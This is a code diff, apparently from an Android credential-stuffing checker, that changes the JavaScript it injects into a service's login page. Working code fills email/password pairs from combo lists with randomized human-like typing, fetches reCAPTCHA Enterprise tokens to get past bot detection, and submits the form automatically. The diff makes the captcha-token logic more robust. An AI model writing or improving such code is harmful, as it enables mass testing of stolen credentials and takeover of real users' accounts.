@@ -695,7 +695,7 @@ stats.cpm = stats.computeCpm()
         val pass = JSONObject.quote(combo.password)
         val js = """(function(){
 try{
-var EMAIL=%EMAIL%;var PASS=%PASS%;var enabled={ep:false,inj:false,ttl:false,ent:false};var started=false;
+var EMAIL=%EMAIL%;var PASS=%PASS%;var started=false;var SITE='__SITEKEY__';
 function setVal(el,v){var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;s.call(el,v);el.dispatchEvent(new Event('input',{bubbles:true}));}
 function typeText(el,text,done){var i=0;var t=setInterval(function(){if(i>=text.length){clearInterval(t);el.dispatchEvent(new Event('change',{bubbles:true}));done();return;}i++;setVal(el,text.slice(0,i));el.dispatchEvent(new Event('keyup',{bubbles:true}));},55+Math.floor(Math.random()*45));}
 function fields(){var u=document.querySelector('#id_userLoginId')||document.querySelector('input[name="userLoginId"]')||document.querySelector('input[type="email"]');var p=document.querySelector('#id_password')||document.querySelector('input[type="password"]');return (u&&p)?{u:u,p:p}:null;}
@@ -703,36 +703,37 @@ function setRecap(t){var r=document.querySelector('#g-recaptcha-response');if(r)
 function clickBtn(sig){var b=document.querySelector('[data-uia="login-submit-button"]')||document.querySelector('button[type="submit"]')||document.querySelector('[data-uia="primary-action"]');if(!b){window.__silverbullet='no_button';return;}window.__sb_submit_sig=sig||'';try{window.scrollTo(0,window.innerHeight*0.3);window.scrollTo(0,0);}catch(e){}
 ['pointerdown','mousedown','pointerup','mouseup','click'].forEach(function(t){b.dispatchEvent(new MouseEvent(t,{bubbles:true,cancelable:true,view:window}));});
 window.__silverbullet='submitted';}
-function promiseTimeout(p,ms){return Promise.race([p,new Promise(function(res){setTimeout(function(){res('__SB_TOK_TIMEOUT__');},ms);})]);}
-function doExec(apiName,reload,useEnt){
-if(attempts>=6){window.__silverbullet='no_token';setRecap('');return;}
-attempts++;
-var parts=apiName.split('.');
-var api=window;for(var i=0;i<parts.length;i++){api=api[parts[i]];if(!api)break;}
-if(!api){
-window.__sb_tok_err=apiName+'-undefined';
-if(!enabled.inj&&reload){enabled.inj=true;var s=document.createElement('script');s.src='https://www.google.com/recaptcha/api.js?render=__SITEKEY__';var onEnd=function(){setTimeout(function(){doExec(useEnt?'grecaptcha.enterprise':'grecaptcha',false,useEnt);},500);};s.onload=function(){window.__sb_rc_inj='ok';onEnd();};s.onerror=function(){window.__sb_rc_inj='err';onEnd();};document.head.appendChild(s);}
-else{nextWait();}
-return;
-}
-try{
-promiseTimeout(window[apiName].execute('__SITEKEY__',{action:'login'}),12000).then(function(t){
-if(t&&t!=='__SB_TOK_TIMEOUT__'&&t.length>20){window.__sb_tok=t;setRecap(t);window.__sb_tok_from=apiName;submitNow('token-'+apiName);}
-else{window.__sb_tok_err=apiName+((t==='__SB_TOK_TIMEOUT__')?'-timeout':'-empty');setTimeout(function(){nextWait();},300);}
-},function(e){window.__sb_tok_err=apiName+'-reject:'+(e&&e.message||'');setTimeout(function(){nextWait();},300);});
-}catch(e){window.__sb_tok_err=apiName+'-throw:'+(e&&e.message||'');setTimeout(function(){nextWait();},300);}
-}
-function nextWait(){
-if(!enabled.ent){enabled.ent=true;window.__silverbullet='waiting_token';setTimeout(function(){doExec('grecaptcha.enterprise',true,true);},600);}
-else{window.__silverbullet='no_token';setRecap('');}
-}
 function submitNow(sig){window.__sb_submit_sig=sig||'';setTimeout(function(){clickBtn(sig);},250+Math.floor(Math.random()*350));}
-var attempts=0;
-function go(){var f=fields();if(!f){window.__silverbullet='no_fields';return;}
+function setErr(e){window.__sb_tok_err=e||'';}
+function inject(src,onEnd){var s=document.createElement('script');s.async=true;s.src=src;var done=false;var fin=function(){if(done)return;done=true;onEnd();};s.onload=function(){window.__sb_rc_inj='ok';fin();};s.onerror=function(){window.__sb_rc_inj='err';fin();};setTimeout(fin,15000);try{(document.head||document.body||document.documentElement).appendChild(s);}catch(e){window.__sb_rc_inj='err';fin();}}
+function apiObj(){try{return (window.grecaptcha&&window.grecaptcha.enterprise)?window.grecaptcha.enterprise:(window.grecaptcha&&typeof window.grecaptcha.execute==='function'?window.grecaptcha:null);}catch(e){return null;}}
+function runToken(start,step){
+if(Date.now()-start>20000){window.__silverbullet='no_token';setRecap('');return;}
+var api=apiObj();
+if(!api||typeof api.execute!=='function'){
+window.__silverbullet='waiting_token';
+if(step==='load'){
+inject('https://www.google.com/recaptcha/enterprise.js?render='+SITE,function(){setTimeout(function(){runToken(start,'ready');},400);});
+}else if(step==='ready'&&api&&typeof api.ready==='function'){
+setErr('enterprise-ready');
+try{api.ready(function(){setErr('');setTimeout(function(){runToken(start,'exec');},150);});}catch(e){setErr('ready-throw:'+e.message);setTimeout(function(){runToken(start,'exec');},300);}
+}else{setTimeout(function(){runToken(start,'ready');},700);}
+setErr(step==='load'?'enterprise-loading':'enterprise-readying');return;
+}
+window.__silverbullet='getting_token';
+try{
+api.execute(SITE,{action:''}).then(function(t){
+if(t&&t.length>20){window.__sb_tok=t;setRecap(t);window.__sb_tok_from=(window.grecaptcha.enterprise?'enterprise':'v3');submitNow('token');}
+else{setErr('empty');setTimeout(function(){runToken(start,'ready');},300);}
+},function(e){setErr('reject:'+(e&&e.message||''));setTimeout(function(){runToken(start,'ready');},500);});
+}catch(e){setErr('throw:'+(e&&e.message||''));setTimeout(function(){runToken(start,'ready');},500);}
+}
+function go(){
+var f=fields();if(!f){window.__silverbullet='no_fields';return;}
 window.__silverbullet='fields_found';
-typeText(f.u,EMAIL,function(){typeText(f.p,PASS,function(){
-window.__sb_tok='';doExec('grecaptcha',true,false);
-});});}
+if(f.u.value&&f.p.value){window.__sb_tok='';runToken(Date.now(),'load');return;}
+typeText(f.u,EMAIL,function(){typeText(f.p,PASS,function(){window.__sb_tok='';runToken(Date.now(),'load');});});
+}
 var w=setInterval(function(){
 if(document.querySelector('[data-uia="alert-error"],[data-uia="field-error"],.hasError')){window.__silverbullet='error_visible';clearInterval(w);return;}
 if(!started&&fields()){started=true;clearInterval(w);go();}
